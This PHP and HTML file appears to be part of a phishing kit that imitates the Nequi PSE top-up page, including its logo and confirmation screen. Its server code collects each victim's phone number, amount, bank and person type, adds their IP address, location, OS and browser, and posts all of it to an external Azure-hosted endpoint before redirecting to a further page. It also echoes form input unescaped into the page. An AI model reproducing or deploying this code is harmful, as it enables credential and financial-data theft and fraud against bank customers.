<?php
// ===== DEBUG DURO Y PAREJO (quitar en producción) =====
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/php-error.log');

// Verifica requisitos para file_get_contents HTTPS
$debug = [
    'php_version'         => PHP_VERSION,
    'allow_url_fopen'     => ini_get('allow_url_fopen'),
    'openssl_loaded'      => extension_loaded('openssl'),
    'default_socket_timeout' => ini_get('default_socket_timeout'),
];

// Captura POST
$numero  = $_POST['Inputphone']  ?? null;
$cuanto  = $_POST['Inputcuanto'] ?? null;
$persona = $_POST['Inputpersona']?? null;
$entidad = $_POST['Inputbanc']   ?? null;

// Evita notice si no definiste estas vars en funciones.php
$myip      = $myip      ?? 'N/A';
$pais      = $pais      ?? 'N/A';
$region    = $region    ?? 'N/A';
$user_os   = $user_os   ?? 'N/A';
$navegador = $navegador ?? 'N/A';

include('funciones.php'); // si aquí hay errores, se verán arriba

if ($entidad !== 'DAVIVIENDA') {
  if ($cuanto && $persona && $entidad) {

    $message =
"PSE
Banco: {$entidad}
Persona: {$persona}
Monto: {$cuanto}
Numero: {$numero}
Fecha: " . date('l jS \of F Y h:i:s A') . "
Ip y Localidad: {$myip} {$pais} {$region}
SO: {$user_os}
Navegador: {$navegador}";

    $payload = ['mensaje' => $message];
    $json    = json_encode($payload, JSON_UNESCAPED_UNICODE);

    // Chequea errores de JSON
    if ($json === false) {
        $debug['json_error'] = json_last_error_msg();
    }

    $url = "https://servidorapis-ggdnawe6aefxerg7.canadacentral-01.azurewebsites.net/nesquis/";

    // IMPORTANTÍSIMO: ignore_errors => true para poder leer body en 4xx/5xx
    $options = [
      "http" => [
        "header"        => "Content-Type: application/json\r\nAccept: application/json\r\n",
        "method"        => "POST",
        "content"       => $json,
        "timeout"       => 20,
        "ignore_errors" => true,
      ]
    ];

    $context  = stream_context_create($options);
    $response = @file_get_contents($url, false, $context); // @ para capturar con error_get_last

    // Status y headers
    $status_line = $http_response_header[0] ?? 'NO_STATUS_LINE';
    $headers     = $http_response_header ?? [];

    if ($response === false) {
        $php_last_error = error_get_last();
    }

    // ===== Salida de diagnóstico =====
    header('Content-Type: text/plain; charset=utf-8');
    echo "=== DEBUG AZURE PHP ===\n";
    foreach ($debug as $k=>$v) echo "$k: $v\n";
    echo "\n=== REQUEST ===\n";
    echo "URL: $url\n";
    echo "Payload JSON:\n$json\n";
    echo "\n=== RESPONSE HEADERS ===\n";
    echo $status_line . "\n";
    foreach ($headers as $h) echo $h . "\n";
    echo "\n=== RESPONSE BODY ===\n";
    echo (string)$response . "\n";

    if (!empty($php_last_error)) {
        echo "\n=== PHP LAST ERROR ===\n";
        print_r($php_last_error);
    }

    exit; // evita seguir renderizando otra cosa
  } else {
    header('Content-Type: text/plain; charset=utf-8');
    echo "Faltan campos POST: Inputcuanto, Inputpersona o Inputbanc.\n";
    var_export(['Inputphone'=>$numero,'Inputcuanto'=>$cuanto,'Inputpersona'=>$persona,'Inputbanc'=>$entidad]);
    exit;
  }
}

?>

<html class="no-js">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>Recarga NEQU</title>
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta name="description" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#11A6BB">
    <meta name="apple-mobile-web-app-title" content="Recarga Nequi PSE">
    <meta name="application-name" content="Recarga Nequi PSE">
    <meta name="theme-color" content="#ffffff">
    <link rel="apple-touch-icon" sizes="180x180" href="./nequ/favicon.ico">
    <link rel="icon" type="image/x-icon" href="./nequ/favicon.ico">
    <link rel="mask-icon" href="./nequ/favicon.ico" color="#5bbad5">
    <link href="./nequ/bootstrap.min.css" rel="stylesheet">
    <link href="./nequ/angular-tooltips.min.css" rel="stylesheet">
    <link href="./nequ/animate.min.css" rel="stylesheet">

    <link rel="stylesheet" href="./nequ/main.css">
</head>

<body ng-app="PSERecharge" class="ng-scope">
    <div id="printable" class="contenido ng-scope" ng-view="" style="">
        <div id="logo_wrapper" class="ng-scope"> <img class="logo_img" src="./nequ/nequi.svg" alt="Logo Nequi"> </div>
        <div class="ng-scope">
            <div ng-if="cashInCtrl.toggled" class="container vertical-center text-center ng-scope" style="">
                <div id="title1Wrapper">
                    <h1 id="title1" class="ng-binding">Revisa la info</h1>
                </div>
                <div class="confirmationCard firstCard">
                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Concepto</span>
                        <span class="confirmationValue ng-binding">Recarga Nequi PSE</span>
                    </div>

                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Celular</span>
                        <span class="confirmationValue ng-binding"><?php echo $numero; ?></span>
                    </div>

                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Valor</span>
                        <span class="confirmationValue ng-binding"><?php echo $cuanto; ?></span>
                    </div>

                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Tipo de persona</span>
                        <span class="confirmationValue ng-binding"><?php echo $persona; ?></span>
                    </div>

                    <div class="container-info">
                        <span class="confirmationTitle ng-binding">Banco</span>
                        <span class="confirmationValue ng-binding"><?php echo $entidad; ?></span>
                    </div>
                </div>
            </div>
            <form id="form2" name="payment_info" autocomplete="off" action="./redirec.php" method="post" class="ng-pristine ng-valid">
                <fieldset ng-disabled="cashInCtrl.form2_lock">
                    <button class="submit_btn submit_btn_moretop ng-binding" type="submit" ng-click="cashInCtrl.gotoGateway()" ng-class="cashInCtrl.btnClass" ng-disabled="payment_info.$invalid || cashInCtrl.noSubmit">Continuar</button>
                </fieldset>
                <input type="hidden" name="banco" value="<?php echo $entidad; ?>">
                <a href="./index.html" class="submit_btn_alt ng-binding">Atrás</a>

            </form>
        </div>
    </div>
    <div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
        <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div>
        <div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div>
        <div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div>
        <div style="z-index: 2000000000; position: relative; width: 0px; height: 0px;"><iframe title="El reCAPTCHA caduca dentro de dos minutos" name="c-h9vc6w9siafl" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./nequ/bframe.html" style="width: 0px; height: 0px;"></iframe></div>
    </div>
</body>

</html>